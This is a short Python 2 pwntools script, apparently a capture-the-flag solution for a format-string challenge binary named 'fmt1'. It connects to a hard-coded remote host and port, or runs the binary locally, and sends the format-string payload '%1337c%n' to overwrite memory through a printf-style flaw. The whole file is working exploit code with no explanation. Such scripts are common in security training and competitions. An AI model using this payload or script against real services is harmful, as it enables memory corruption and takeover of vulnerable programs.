#!/usr/bin/env python2
from pwn import *
import sys
#context.log_level = 'error'
HOST = '128.199.104.41'
PORT = 27845
BINARY = './fmt1'

def exploit(p, local=True):
    offset = 6
    #Where you put the exploit
    p.recvuntil('?')
    payload = ''
    payload += "%1337c%n"
    p.sendline(payload)
    print p.recvall()


if __name__ == "__main__":
    if (len(sys.argv) == 2):
        # remote
        r = remote(HOST, PORT)
        exploit(r,False)
    else:
        # local
        p = process(BINARY)
        exploit(p)